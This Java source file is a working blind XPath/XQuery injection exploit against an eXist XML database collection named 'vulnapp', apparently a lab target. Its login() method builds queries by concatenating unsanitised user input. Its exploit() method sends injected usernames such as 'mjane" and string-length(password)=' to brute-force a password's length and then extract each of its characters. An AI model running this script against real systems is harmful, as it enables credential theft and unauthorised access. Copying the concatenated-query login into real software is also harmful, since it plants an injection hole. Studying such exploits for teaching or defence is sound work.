import org.xmldb.api.DatabaseManager;
import org.xmldb.api.base.Collection;
import org.xmldb.api.base.Database;
import org.xmldb.api.base.ResourceIterator;
import org.xmldb.api.base.ResourceSet;
import org.xmldb.api.modules.XMLResource;
import org.xmldb.api.modules.XPathQueryService;

public class DBDump {
    protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
    protected static String URI = "xmldb:exist://192.168.10.130:8080/exist/xmlrpc";
    protected static String collectionPath = "/db/vulnapp/";
    protected static String resourceName = "user.xml";
    public static Collection col = null;

    public static void main(String[] args) throws Exception {
        Class cl = Class.forName(DRIVER);
        Database database = (Database) cl.newInstance();
        DatabaseManager.registerDatabase(database);

        // get the collection
        col = DatabaseManager.getCollection(URI + collectionPath);
        try {
            exploit();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void  exploit() throws Exception{
        //Finding the password length
        String payload = "mjane\" and string-length(password)=";
        String append_payload = " or .=\"";
        int length = 1;
        while(true){
            if(!login(payload+length+append_payload,"abc")){
                length++;
            }else
                break;
        }

        System.out.println("The password length is "+length);

        payload = "mjane\" and substring(password,<i>,1)=\"<char>\"";
        int startChar = 48;
        int endChar = 126;

        String found="";
        for(int i=1; i<=length; i++){
            String temp_payload = payload.replace("<i>",Integer.toString(i));
            for(int a=startChar; a<=endChar;a++) {
                if (login(temp_payload.replace("<char>", Character.toString((char)a)) + append_payload, "abc")) {
                    found += Character.toString((char)a);
                    break;
                }
            }
            System.out.println(found);
        }

    }

    public static boolean login (String username, String password) throws Exception{

        // query a document
        String xQuery = "doc(\"user.xml\")/userlist/user[uname=\""+username+"\" and password=\""+password+"\"]";
        //System.out.println(xQuery);

        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
        xpqs.setProperty("indent", "yes");

        // Execute the query, print the result
        ResourceSet result = xpqs.query(xQuery);
        ResourceIterator i = result.getIterator();
//        while (i.hasMoreResources()) {
//            Resource r = i.nextResource();
//            System.out.println((String) r.getContent());
//        }
        if (i.hasMoreResources())
            return true;
        else
            return false;
    }
}
